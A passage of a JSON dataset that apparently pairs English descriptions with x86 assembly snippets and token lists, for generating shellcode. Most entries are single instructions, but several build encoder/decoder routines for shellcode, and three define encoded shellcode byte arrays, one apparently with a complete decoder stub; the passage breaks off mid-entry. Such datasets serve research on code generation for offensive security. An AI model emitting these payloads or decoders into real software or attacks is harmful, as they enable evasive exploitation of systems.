    "snippet": "mov cl, byte [esi + edx + 3]",
    "slot_map": {
      "esi+edx+3": "var0"
    },
    "intent_tokens": [
      "save",
      "byte",
      "var0",
      "cl"
    ],
    "snippet_tokens": [
      "mov",
      "cl",
      ",",
      "byte",
      "[",
      "esi",
      "+",
      "edx",
      "+",
      "3",
      "]"
    ]
  },
  {
    "intent": "move dl into cl",
    "rewritten_intent": "move dl into cl",
    "snippet": "mov cl, dl",
    "slot_map": {},
    "intent_tokens": [
      "move",
      "dl",
      "cl"
    ],
    "snippet_tokens": [
      "mov",
      "cl",
      ",",
      "dl"
    ]
  },
  {
    "intent": "move the address of esi-1 into dl",
    "rewritten_intent": "move the address of esi-1 into dl",
    "snippet": "mov dl, [esi-1]",
    "slot_map": {
      "esi-1": "var0"
    },
    "intent_tokens": [
      "move",
      "address",
      "var0",
      "dl"
    ],
    "snippet_tokens": [
      "mov",
      "dl",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "move the previous byte of the shellcode to dl",
    "rewritten_intent": "move the previous byte of the shellcode to dl",
    "snippet": "mov dl, [esi-1]",
    "slot_map": {},
    "intent_tokens": [
      "move",
      "previous",
      "byte",
      "shellcode",
      "dl"
    ],
    "snippet_tokens": [
      "mov",
      "dl",
      ",",
      "[",
      "esi-1",
      "]"
    ]
  },
  {
    "intent": "move the contents of dl into the next byte of the shellcode",
    "rewritten_intent": "move the contents of dl into the next byte of the shellcode",
    "snippet": "mov dl, [esi+1]",
    "slot_map": {},
    "intent_tokens": [
      "move",
      "contents",
      "dl",
      "next",
      "byte",
      "shellcode"
    ],
    "snippet_tokens": [
      "mov",
      "dl",
      ",",
      "[",
      "esi+1",
      "]"
    ]
  },
  {
    "intent": "move 0x45 to dl",
    "rewritten_intent": "move 0x45 to dl",
    "snippet": "mov dl, 0x45",
    "slot_map": {
      "0x45": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "dl"
    ],
    "snippet_tokens": [
      "mov",
      "dl",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0xff to dl",
    "rewritten_intent": "move 0xff to dl",
    "snippet": "mov dl, 0xff",
    "slot_map": {
      "0xff": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "dl"
    ],
    "snippet_tokens": [
      "mov",
      "dl",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the byte at address eax+1 to dl",
    "rewritten_intent": "move the byte at address eax+1 to dl",
    "snippet": "mov dl, byte [eax + 1]",
    "slot_map": {
      "eax+1": "var0"
    },
    "intent_tokens": [
      "move",
      "byte",
      "address",
      "var0",
      "dl"
    ],
    "snippet_tokens": [
      "mov",
      "dl",
      ",",
      "byte",
      "[",
      "eax",
      "+",
      "1",
      "]"
    ]
  },
  {
    "intent": "move the byte at address eax to dl",
    "rewritten_intent": "move the byte at address eax to dl",
    "snippet": "mov dl, byte [eax]",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "move",
      "byte",
      "address",
      "var0",
      "dl"
    ],
    "snippet_tokens": [
      "mov",
      "dl",
      ",",
      "byte",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "move the contents of the address esi+1 into dl",
    "rewritten_intent": "move the contents of the address esi+1 into dl",
    "snippet": "mov dl, byte [esi + 1]",
    "slot_map": {
      "esi+1": "var0"
    },
    "intent_tokens": [
      "move",
      "contents",
      "address",
      "var0",
      "dl"
    ],
    "snippet_tokens": [
      "mov",
      "dl",
      ",",
      "byte",
      "[",
      "esi",
      "+",
      "1",
      "]"
    ]
  },
  {
    "intent": "move the byte at the address esi+edi+1 into dl",
    "rewritten_intent": "move the byte at the address esi+edi+1 into dl",
    "snippet": "mov dl, byte [esi + edi + 1]",
    "slot_map": {
      "esi+edi+1": "var0"
    },
    "intent_tokens": [
      "move",
      "byte",
      "address",
      "var0",
      "dl"
    ],
    "snippet_tokens": [
      "mov",
      "dl",
      ",",
      "byte",
      "[",
      "esi",
      "+",
      "edi",
      "+",
      "1",
      "]"
    ]
  },
  {
    "intent": "put the byte in esi into dl",
    "rewritten_intent": "put the byte in esi into dl",
    "snippet": "mov dl, byte [esi]",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "put",
      "byte",
      "var0",
      "dl"
    ],
    "snippet_tokens": [
      "mov",
      "dl",
      ",",
      "byte",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "move edi to eax",
    "rewritten_intent": "move edi to eax",
    "snippet": "mov eax, edi",
    "slot_map": {
      "edi": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "copy the value of ebp to ecx",
    "rewritten_intent": "copy the value of ebp to ecx",
    "snippet": "mov ecx, ebp",
    "slot_map": {
      "ebp": "var0",
      "ecx": "var1"
    },
    "intent_tokens": [
      "copy",
      "value",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0xaaaa9090 to edi",
    "rewritten_intent": "move 0xaaaa9090 to edi",
    "snippet": "mov edi, 0xaaaa9090",
    "slot_map": {
      "0xaaaa9090": "var0",
      "edi": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the pointer to the shellcode into edi",
    "rewritten_intent": "move the pointer to the shellcode into edi",
    "snippet": "mov edi, esi",
    "slot_map": {
      "edi": "var0"
    },
    "intent_tokens": [
      "move",
      "pointer",
      "shellcode",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "esi"
    ]
  },
  {
    "intent": "point edx to the stack pointer",
    "rewritten_intent": "point edx to the stack pointer",
    "snippet": "mov edx, esp",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "point",
      "var0",
      "stack",
      "pointer"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "esp"
    ]
  },
  {
    "intent": "move ax into the word in edi",
    "rewritten_intent": "move ax into the word in edi",
    "snippet": "mov word [edi], ax",
    "slot_map": {
      "edi": "var0"
    },
    "intent_tokens": [
      "move",
      "ax",
      "word",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "word",
      "[",
      "var0",
      "]",
      ",",
      "ax"
    ]
  },
  {
    "intent": "in the negative function negate dl and increment dl to the next byte",
    "rewritten_intent": "in the negative function negate dl and increment dl to the next byte",
    "snippet": "negative: \\n not dl \\n inc dl",
    "slot_map": {
      "negative": "var0"
    },
    "intent_tokens": [
      "in",
      "var0",
      "function",
      "negate",
      "dl",
      "and",
      "increment",
      "dl",
      "next",
      "byte"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "not",
      "dl",
      "\\n",
      "inc",
      "dl"
    ]
  },
  {
    "intent": "in next_cycle increment edi by one and jump short to formatting",
    "rewritten_intent": "in next_cycle increment edi by one and jump short to formatting",
    "snippet": "next_cycle: \\n inc edi \\n jmp short formatting",
    "slot_map": {
      "next_cycle": "var0",
      "edi": "var1"
    },
    "intent_tokens": [
      "in",
      "var0",
      "increment",
      "var1",
      "one",
      "and",
      "jump",
      "short",
      "formatting"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "inc",
      "var1",
      "\\n",
      "jmp",
      "short",
      "formatting"
    ]
  },
  {
    "intent": "not operation of current byte in esi",
    "rewritten_intent": "not operation of current byte in esi",
    "snippet": "not byte [esi]",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "not",
      "operation",
      "current",
      "byte",
      "var0"
    ],
    "snippet_tokens": [
      "not",
      "byte",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "not_equal label",
    "rewritten_intent": "not_equal label",
    "snippet": "not_equal:",
    "slot_map": {
      "not_equal": "var0"
    },
    "intent_tokens": [
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "notdecode function",
    "rewritten_intent": "notdecode function",
    "snippet": "notdecode:",
    "slot_map": {
      "notdecode": "var0"
    },
    "intent_tokens": [
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "define odd_number",
    "rewritten_intent": "define odd_number",
    "snippet": "odd_number:",
    "slot_map": {
      "odd_number": "var0"
    },
    "intent_tokens": [
      "define",
      "var0"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "pop the address of the encoded shellcode into esi",
    "rewritten_intent": "pop the address of the encoded shellcode into esi",
    "snippet": "pop esi",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "pop",
      "address",
      "encoded",
      "shellcode",
      "var0"
    ],
    "snippet_tokens": [
      "pop",
      "var0"
    ]
  },
  {
    "intent": "store the address of the shellcode in esi",
    "rewritten_intent": "store the address of the shellcode in esi",
    "snippet": "pop esi",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "store",
      "address",
      "shellcode",
      "var0"
    ],
    "snippet_tokens": [
      "pop",
      "var0"
    ]
  },
  {
    "intent": "store the pointer to the encoded shellcode in esi",
    "rewritten_intent": "store the pointer to the encoded shellcode in esi",
    "snippet": "pop esi",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "store",
      "pointer",
      "encoded",
      "shellcode",
      "var0"
    ],
    "snippet_tokens": [
      "pop",
      "var0"
    ]
  },
  {
    "intent": "store the shellcode in esi",
    "rewritten_intent": "store the shellcode in esi",
    "snippet": "pop esi",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "store",
      "shellcode",
      "var0"
    ],
    "snippet_tokens": [
      "pop",
      "var0"
    ]
  },
  {
    "intent": "store the shellcode in esi and move it into cx",
    "rewritten_intent": "store the shellcode in esi and move it into cx",
    "snippet": "pop esi \\n mov cx, [esi]",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "store",
      "shellcode",
      "var0",
      "and",
      "move",
      "it",
      "cx"
    ],
    "snippet_tokens": [
      "pop",
      "var0",
      "\\n",
      "mov",
      "cx",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "push the encoded shellcode pointer to stack",
    "rewritten_intent": "push the encoded shellcode pointer to stack",
    "snippet": "push esi",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "encoded",
      "shellcode",
      "pointer",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "esi"
    ]
  },
  {
    "intent": "push the stack onto esi and move the contents on edi",
    "rewritten_intent": "push the stack onto esi and move the contents on edi",
    "snippet": "push esi \\n mov edi, esi",
    "slot_map": {
      "esi": "var0",
      "edi": "var1"
    },
    "intent_tokens": [
      "push",
      "stack",
      "var0",
      "and",
      "move",
      "contents",
      "var1"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "returnlabel label",
    "rewritten_intent": "returnlabel label",
    "snippet": "returnlabel:",
    "slot_map": {
      "returnlabel": "var0"
    },
    "intent_tokens": [
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "left rotate the shellcode by one",
    "rewritten_intent": "left rotate the shellcode by one",
    "snippet": "rol byte [esi], 0x1",
    "slot_map": {},
    "intent_tokens": [
      "left",
      "rotate",
      "shellcode",
      "one"
    ],
    "snippet_tokens": [
      "rol",
      "byte",
      "[",
      "esi",
      "]",
      ",",
      "0x1"
    ]
  },
  {
    "intent": "right rotate bl by the contents of cl",
    "rewritten_intent": "right rotate bl by the contents of cl",
    "snippet": "ror bl, cl",
    "slot_map": {
      "bl": "var0"
    },
    "intent_tokens": [
      "right",
      "rotate",
      "var0",
      "contents",
      "cl"
    ],
    "snippet_tokens": [
      "ror",
      "var0",
      ",",
      "cl"
    ]
  },
  {
    "intent": "right rotate the shellcode in esi by one",
    "rewritten_intent": "right rotate the shellcode in esi by one",
    "snippet": "ror byte [esi], 0x1",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "right",
      "rotate",
      "shellcode",
      "var0",
      "one"
    ],
    "snippet_tokens": [
      "ror",
      "byte",
      "[",
      "var0",
      "]",
      ",",
      "0x1"
    ]
  },
  {
    "intent": "section text",
    "rewritten_intent": "section text",
    "snippet": "section .text",
    "slot_map": {},
    "intent_tokens": [
      "section",
      "text"
    ],
    "snippet_tokens": [
      "section",
      ".text"
    ]
  },
  {
    "intent": "define shellcode_length equal to the size of shellcode",
    "rewritten_intent": "define shellcode_length equal to the size of shellcode",
    "snippet": "shellcode_length equ $-shellcode",
    "slot_map": {
      "shellcode_length": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "equal",
      "size",
      "shellcode"
    ],
    "snippet_tokens": [
      "var0",
      "equ",
      "$",
      "-shellcode"
    ]
  },
  {
    "intent": "in shellcode_section go to decoder's main",
    "rewritten_intent": "in shellcode_section go to decoder's main",
    "snippet": "shellcode_section \\n call decoder",
    "slot_map": {
      "shellcode_section": "var0",
      "'s": "var1"
    },
    "intent_tokens": [
      "in",
      "var0",
      "go",
      "decoder",
      "'s",
      "main"
    ],
    "snippet_tokens": [
      "var0",
      "\\n",
      "call",
      "decoder"
    ]
  },
  {
    "intent": "define shellcode as the array of bytes 0x0e,0x3a,0x94,0x12,0x12,0x12,0xb2,0x9b,0x37,0xc3,0x52,0xb6,0x9d,0xa2,0xc2,0x9d,0xa4,0x1e,0x9d,0xa4,0xe6,0x9d,0x84,0xfa,0x21,0x49,0xdc,0xf8,0xc3,0x11,0x7e,0xce,0xb3,0x8e,0x14,0xfe,0xf2,0x53,0x61,0x1f,0x13,0x59,0x34,0x04,0xa4,0xa9,0x9d,0xa4,0xe2,0x9d,0xdc,0xce,0x9d,0xde,0xe3,0x8a,0x35,0xda,0x13,0x23,0xa3,0x9d,0xab,0xf2,0x13,0x25,0x9d,0xdb,0xea,0x35,0xcc,0xdb,0x9d,0xc6,0x9d,0x13,0x28,0xc3,0x11,0x7e,0x53,0x61,0x1f,0x13,0x59,0xca,0x32,0x87,0x08,0x15,0x8f,0x0a,0xcd,0x8f,0xf6,0x87,0x36,0xaa,0x9d,0xaa,0xf6,0x13,0x25,0xb8,0x9d,0x1e,0xdd,0x9d,0xaa,0xee,0x13,0x25,0x9d,0x16,0x9d,0x13,0x22,0x9b,0xd6,0xf6,0xf6,0xad,0xad,0xb3,0xab,0xac,0xa3,0x11,0x32,0xb1,0xb1,0xac,0x9d,0xe4,0x3d,0x9f,0xaf,0xba,0xc5,0xc4,0x12,0x12,0xba,0x89,0x85,0xc4,0xb1,0xa6,0xba,0xde,0x89,0xf8,0x19,0x11,0x27,0x4a,0x62,0x13,0x12,0x12,0xfb,0x56,0xa6,0xa2,0xba,0xfb,0x92,0xbd,0x12,0x11,0x27,0xa2,0xa2,0xa2,0xa2,0xd2,0xa2,0xd2,0xa2,0xba,0x3c,0x21,0x31,0x32,0x11,0x27,0x69,0xbc,0x17,0xba,0x52,0x7a,0x86,0x59,0xba,0x14,0x12,0x13,0x4d,0x9b,0x38,0xbc,0xe2,0xa8,0xa9,0xba,0x6b,0x77,0x86,0xb3,0x11,0x27,0x97,0x52,0x86,0x1e,0x11,0xe0,0x1a,0x87,0x3e,0xba,0x02,0x47,0x74,0xa8,0x11,0x27,0xba,0xb5,0xbf,0xb6,0x12,0x9b,0x35,0xa9,0xa9,0xa9,0xc3,0x08,0xbc,0xe4,0xab,0xa8,0x34,0x0f,0xb8,0x59,0xd6,0xf6,0xce,0x13,0x13,0x9f,0xd6,0xf6,0xe2,0x58,0x12,0xd6,0xa6,0xa2,0xa8,0xa8,0xa8,0xd8,0xa8,0xe0,0xa8,0xa8,0xa5,0xa8,0xba,0x8b,0x5e,0xd1,0x98,0x11,0x27,0x9b,0x32,0xe0,0xa8,0xd8,0x11,0xc2,0xba,0x1a,0x99,0xef,0xb2,0x11,0x27,0x4d,0x02,0x47,0x74,0xa8,0xba,0x78,0x67,0x4f,0x6f,0x11,0x27,0xce,0x18,0x8e,0x1c,0x92,0x0d,0x32,0x87,0x17,0x4d,0xd9,0xe5,0x84,0xc1,0xbc,0x12,0xa5,0x11,0x27,0x88",
    "rewritten_intent": "define shellcode as the array of bytes 0x0e,0x3a,0x94,0x12,0x12,0x12,0xb2,0x9b,0x37,0xc3,0x52,0xb6,0x9d,0xa2,0xc2,0x9d,0xa4,0x1e,0x9d,0xa4,0xe6,0x9d,0x84,0xfa,0x21,0x49,0xdc,0xf8,0xc3,0x11,0x7e,0xce,0xb3,0x8e,0x14,0xfe,0xf2,0x53,0x61,0x1f,0x13,0x59,0x34,0x04,0xa4,0xa9,0x9d,0xa4,0xe2,0x9d,0xdc,0xce,0x9d,0xde,0xe3,0x8a,0x35,0xda,0x13,0x23,0xa3,0x9d,0xab,0xf2,0x13,0x25,0x9d,0xdb,0xea,0x35,0xcc,0xdb,0x9d,0xc6,0x9d,0x13,0x28,0xc3,0x11,0x7e,0x53,0x61,0x1f,0x13,0x59,0xca,0x32,0x87,0x08,0x15,0x8f,0x0a,0xcd,0x8f,0xf6,0x87,0x36,0xaa,0x9d,0xaa,0xf6,0x13,0x25,0xb8,0x9d,0x1e,0xdd,0x9d,0xaa,0xee,0x13,0x25,0x9d,0x16,0x9d,0x13,0x22,0x9b,0xd6,0xf6,0xf6,0xad,0xad,0xb3,0xab,0xac,0xa3,0x11,0x32,0xb1,0xb1,0xac,0x9d,0xe4,0x3d,0x9f,0xaf,0xba,0xc5,0xc4,0x12,0x12,0xba,0x89,0x85,0xc4,0xb1,0xa6,0xba,0xde,0x89,0xf8,0x19,0x11,0x27,0x4a,0x62,0x13,0x12,0x12,0xfb,0x56,0xa6,0xa2,0xba,0xfb,0x92,0xbd,0x12,0x11,0x27,0xa2,0xa2,0xa2,0xa2,0xd2,0xa2,0xd2,0xa2,0xba,0x3c,0x21,0x31,0x32,0x11,0x27,0x69,0xbc,0x17,0xba,0x52,0x7a,0x86,0x59,0xba,0x14,0x12,0x13,0x4d,0x9b,0x38,0xbc,0xe2,0xa8,0xa9,0xba,0x6b,0x77,0x86,0xb3,0x11,0x27,0x97,0x52,0x86,0x1e,0x11,0xe0,0x1a,0x87,0x3e,0xba,0x02,0x47,0x74,0xa8,0x11,0x27,0xba,0xb5,0xbf,0xb6,0x12,0x9b,0x35,0xa9,0xa9,0xa9,0xc3,0x08,0xbc,0xe4,0xab,0xa8,0x34,0x0f,0xb8,0x59,0xd6,0xf6,0xce,0x13,0x13,0x9f,0xd6,0xf6,0xe2,0x58,0x12,0xd6,0xa6,0xa2,0xa8,0xa8,0xa8,0xd8,0xa8,0xe0,0xa8,0xa8,0xa5,0xa8,0xba,0x8b,0x5e,0xd1,0x98,0x11,0x27,0x9b,0x32,0xe0,0xa8,0xd8,0x11,0xc2,0xba,0x1a,0x99,0xef,0xb2,0x11,0x27,0x4d,0x02,0x47,0x74,0xa8,0xba,0x78,0x67,0x4f,0x6f,0x11,0x27,0xce,0x18,0x8e,0x1c,0x92,0x0d,0x32,0x87,0x17,0x4d,0xd9,0xe5,0x84,0xc1,0xbc,0x12,0xa5,0x11,0x27,0x88",
    "snippet": "shellcode: db 0x0e,0x3a,0x94,0x12,0x12,0x12,0xb2,0x9b,0x37,0xc3,0x52,0xb6,0x9d,0xa2,0xc2,0x9d,0xa4,0x1e,0x9d,0xa4,0xe6,0x9d,0x84,0xfa,0x21,0x49,0xdc,0xf8,0xc3,0x11,0x7e,0xce,0xb3,0x8e,0x14,0xfe,0xf2,0x53,0x61,0x1f,0x13,0x59,0x34,0x04,0xa4,0xa9,0x9d,0xa4,0xe2,0x9d,0xdc,0xce,0x9d,0xde,0xe3,0x8a,0x35,0xda,0x13,0x23,0xa3,0x9d,0xab,0xf2,0x13,0x25,0x9d,0xdb,0xea,0x35,0xcc,0xdb,0x9d,0xc6,0x9d,0x13,0x28,0xc3,0x11,0x7e,0x53,0x61,0x1f,0x13,0x59,0xca,0x32,0x87,0x08,0x15,0x8f,0x0a,0xcd,0x8f,0xf6,0x87,0x36,0xaa,0x9d,0xaa,0xf6,0x13,0x25,0xb8,0x9d,0x1e,0xdd,0x9d,0xaa,0xee,0x13,0x25,0x9d,0x16,0x9d,0x13,0x22,0x9b,0xd6,0xf6,0xf6,0xad,0xad,0xb3,0xab,0xac,0xa3,0x11,0x32,0xb1,0xb1,0xac,0x9d,0xe4,0x3d,0x9f,0xaf,0xba,0xc5,0xc4,0x12,0x12,0xba,0x89,0x85,0xc4,0xb1,0xa6,0xba,0xde,0x89,0xf8,0x19,0x11,0x27,0x4a,0x62,0x13,0x12,0x12,0xfb,0x56,0xa6,0xa2,0xba,0xfb,0x92,0xbd,0x12,0x11,0x27,0xa2,0xa2,0xa2,0xa2,0xd2,0xa2,0xd2,0xa2,0xba,0x3c,0x21,0x31,0x32,0x11,0x27,0x69,0xbc,0x17,0xba,0x52,0x7a,0x86,0x59,0xba,0x14,0x12,0x13,0x4d,0x9b,0x38,0xbc,0xe2,0xa8,0xa9,0xba,0x6b,0x77,0x86,0xb3,0x11,0x27,0x97,0x52,0x86,0x1e,0x11,0xe0,0x1a,0x87,0x3e,0xba,0x02,0x47,0x74,0xa8,0x11,0x27,0xba,0xb5,0xbf,0xb6,0x12,0x9b,0x35,0xa9,0xa9,0xa9,0xc3,0x08,0xbc,0xe4,0xab,0xa8,0x34,0x0f,0xb8,0x59,0xd6,0xf6,0xce,0x13,0x13,0x9f,0xd6,0xf6,0xe2,0x58,0x12,0xd6,0xa6,0xa2,0xa8,0xa8,0xa8,0xd8,0xa8,0xe0,0xa8,0xa8,0xa5,0xa8,0xba,0x8b,0x5e,0xd1,0x98,0x11,0x27,0x9b,0x32,0xe0,0xa8,0xd8,0x11,0xc2,0xba,0x1a,0x99,0xef,0xb2,0x11,0x27,0x4d,0x02,0x47,0x74,0xa8,0xba,0x78,0x67,0x4f,0x6f,0x11,0x27,0xce,0x18,0x8e,0x1c,0x92,0x0d,0x32,0x87,0x17,0x4d,0xd9,0xe5,0x84,0xc1,0xbc,0x12,0xa5,0x11,0x27,0x88",
    "slot_map": {
      "0x0e,0x3a,0x94,0x12,0x12,0x12,0xb2,0x9b,0x37,0xc3,0x52,0xb6,0x9d,0xa2,0xc2,0x9d,0xa4,0x1e,0x9d,0xa4,0xe6,0x9d,0x84,0xfa,0x21,0x49,0xdc,0xf8,0xc3,0x11,0x7e,0xce,0xb3,0x8e,0x14,0xfe,0xf2,0x53,0x61,0x1f,0x13,0x59,0x34,0x04,0xa4,0xa9,0x9d,0xa4,0xe2,0x9d,0xdc,0xce,0x9d,0xde,0xe3,0x8a,0x35,0xda,0x13,0x23,0xa3,0x9d,0xab,0xf2,0x13,0x25,0x9d,0xdb,0xea,0x35,0xcc,0xdb,0x9d,0xc6,0x9d,0x13,0x28,0xc3,0x11,0x7e,0x53,0x61,0x1f,0x13,0x59,0xca,0x32,0x87,0x08,0x15,0x8f,0x0a,0xcd,0x8f,0xf6,0x87,0x36,0xaa,0x9d,0xaa,0xf6,0x13,0x25,0xb8,0x9d,0x1e,0xdd,0x9d,0xaa,0xee,0x13,0x25,0x9d,0x16,0x9d,0x13,0x22,0x9b,0xd6,0xf6,0xf6,0xad,0xad,0xb3,0xab,0xac,0xa3,0x11,0x32,0xb1,0xb1,0xac,0x9d,0xe4,0x3d,0x9f,0xaf,0xba,0xc5,0xc4,0x12,0x12,0xba,0x89,0x85,0xc4,0xb1,0xa6,0xba,0xde,0x89,0xf8,0x19,0x11,0x27,0x4a,0x62,0x13,0x12,0x12,0xfb,0x56,0xa6,0xa2,0xba,0xfb,0x92,0xbd,0x12,0x11,0x27,0xa2,0xa2,0xa2,0xa2,0xd2,0xa2,0xd2,0xa2,0xba,0x3c,0x21,0x31,0x32,0x11,0x27,0x69,0xbc,0x17,0xba,0x52,0x7a,0x86,0x59,0xba,0x14,0x12,0x13,0x4d,0x9b,0x38,0xbc,0xe2,0xa8,0xa9,0xba,0x6b,0x77,0x86,0xb3,0x11,0x27,0x97,0x52,0x86,0x1e,0x11,0xe0,0x1a,0x87,0x3e,0xba,0x02,0x47,0x74,0xa8,0x11,0x27,0xba,0xb5,0xbf,0xb6,0x12,0x9b,0x35,0xa9,0xa9,0xa9,0xc3,0x08,0xbc,0xe4,0xab,0xa8,0x34,0x0f,0xb8,0x59,0xd6,0xf6,0xce,0x13,0x13,0x9f,0xd6,0xf6,0xe2,0x58,0x12,0xd6,0xa6,0xa2,0xa8,0xa8,0xa8,0xd8,0xa8,0xe0,0xa8,0xa8,0xa5,0xa8,0xba,0x8b,0x5e,0xd1,0x98,0x11,0x27,0x9b,0x32,0xe0,0xa8,0xd8,0x11,0xc2,0xba,0x1a,0x99,0xef,0xb2,0x11,0x27,0x4d,0x02,0x47,0x74,0xa8,0xba,0x78,0x67,0x4f,0x6f,0x11,0x27,0xce,0x18,0x8e,0x1c,0x92,0x0d,0x32,0x87,0x17,0x4d,0xd9,0xe5,0x84,0xc1,0xbc,0x12,0xa5,0x11,0x27,0x88": "var0"
    },
    "intent_tokens": [
      "define",
      "shellcode",
      "array",
      "bytes",
      "var0"
    ],
    "snippet_tokens": [
      "shellcode",
      ":",
      "db",
      "var0"
    ]
  },
  {
    "intent": "define shellcode as array of bytes 0x18,0x38,0xc7,0x57,0x6f,0x36,0x36,0x7a,0x6f,0x6f,0x36,0x69,0x70,0x75,0x90,0xea,0x38,0xd0,0x90,0xd1,0x71,0x12,0x5f,0xd4,0x87",
    "rewritten_intent": "define shellcode as array of bytes 0x18,0x38,0xc7,0x57,0x6f,0x36,0x36,0x7a,0x6f,0x6f,0x36,0x69,0x70,0x75,0x90,0xea,0x38,0xd0,0x90,0xd1,0x71,0x12,0x5f,0xd4,0x87",
    "snippet": "shellcode: db 0x18,0x38,0xc7,0x57,0x6f,0x36,0x36,0x7a,0x6f,0x6f,0x36,0x69,0x70,0x75,0x90,0xea,0x38,0xd0,0x90,0xd1,0x71,0x12,0x5f,0xd4,0x87",
    "slot_map": {
      "0x18,0x38,0xc7,0x57,0x6f,0x36,0x36,0x7a,0x6f,0x6f,0x36,0x69,0x70,0x75,0x90,0xea,0x38,0xd0,0x90,0xd1,0x71,0x12,0x5f,0xd4,0x87": "var0"
    },
    "intent_tokens": [
      "define",
      "shellcode",
      "array",
      "bytes",
      "var0"
    ],
    "snippet_tokens": [
      "shellcode",
      ":",
      "db",
      "var0"
    ]
  },
  {
    "intent": "shellcode contains the bytes 0x31,0xc0,0x31,0xdb,0x31,0xc9,0x31,0xd2,0xb2,0xa4,0xeb,0x1f,0x5e,0x8d,0x3e,0x8a,0x1c,0x0f,0x88,0xdf,0x88,0xd0,0x30,0xd8,0x74,0x16,0x66,0x8b,0x44,0x0f,0x01,0x66,0x31,0xd8,0x66,0x89,0x07,0x41,0x8d,0x7f,0x02,0xeb,0xe4,0xe8,0xdc,0xff,0xff,0xff,0x7d,0x4c,0xa6,0x09,0xfe,0xea,0xd8,0x8b,0x9b,0x0c,0x5f,0x66,0x30,0x32,0xb9,0x07,0xe6,0xb7,0x0f,0x69,0xc2,0xab,0x2b,0xf0,0x3e,0x60,0x6c,0xea,0x82,0xe8,0x63,0x63,0x72,0x68,0x34,0x02,0xeb,0xfb,0xba,0xef,0xbf,0x66,0xf4,0x15,0x9e,0xbb,0xdd,0xe3,0x73,0xbe,0xf3,0xbb,0x32,0xfa,0xeb,0xef,0x58,0x20,0x24,0x90,0xe3,0x85,0x2e,0x64,0xe4,0x27,0x59,0xe9,0x3f,0xee,0x23,0x6e,0x63,0xf0,0x3a,0x47,0x2d,0x78,0x68,0x30,0xa5,0x66,0xe6,0x2f,0x69,0x10,0x91,0xfa,0x92,0xd5,0x3e,0x11,0x4d,0xf4,0x9c,0x9c,0x16,0x39,0x74,0xa0,0xc9,0xce,0xd2,0x5b,0x31,0x5c,0x0c,0x0f,0xfb,0x72,0x1a,0xb6,0x06,0xbd,0xd1,0x1c,0x51,0xa4",
    "rewritten_intent": "shellcode contains the bytes 0x31,0xc0,0x31,0xdb,0x31,0xc9,0x31,0xd2,0xb2,0xa4,0xeb,0x1f,0x5e,0x8d,0x3e,0x8a,0x1c,0x0f,0x88,0xdf,0x88,0xd0,0x30,0xd8,0x74,0x16,0x66,0x8b,0x44,0x0f,0x01,0x66,0x31,0xd8,0x66,0x89,0x07,0x41,0x8d,0x7f,0x02,0xeb,0xe4,0xe8,0xdc,0xff,0xff,0xff,0x7d,0x4c,0xa6,0x09,0xfe,0xea,0xd8,0x8b,0x9b,0x0c,0x5f,0x66,0x30,0x32,0xb9,0x07,0xe6,0xb7,0x0f,0x69,0xc2,0xab,0x2b,0xf0,0x3e,0x60,0x6c,0xea,0x82,0xe8,0x63,0x63,0x72,0x68,0x34,0x02,0xeb,0xfb,0xba,0xef,0xbf,0x66,0xf4,0x15,0x9e,0xbb,0xdd,0xe3,0x73,0xbe,0xf3,0xbb,0x32,0xfa,0xeb,0xef,0x58,0x20,0x24,0x90,0xe3,0x85,0x2e,0x64,0xe4,0x27,0x59,0xe9,0x3f,0xee,0x23,0x6e,0x63,0xf0,0x3a,0x47,0x2d,0x78,0x68,0x30,0xa5,0x66,0xe6,0x2f,0x69,0x10,0x91,0xfa,0x92,0xd5,0x3e,0x11,0x4d,0xf4,0x9c,0x9c,0x16,0x39,0x74,0xa0,0xc9,0xce,0xd2,0x5b,0x31,0x5c,0x0c,0x0f,0xfb,0x72,0x1a,0xb6,0x06,0xbd,0xd1,0x1c,0x51,0xa4",
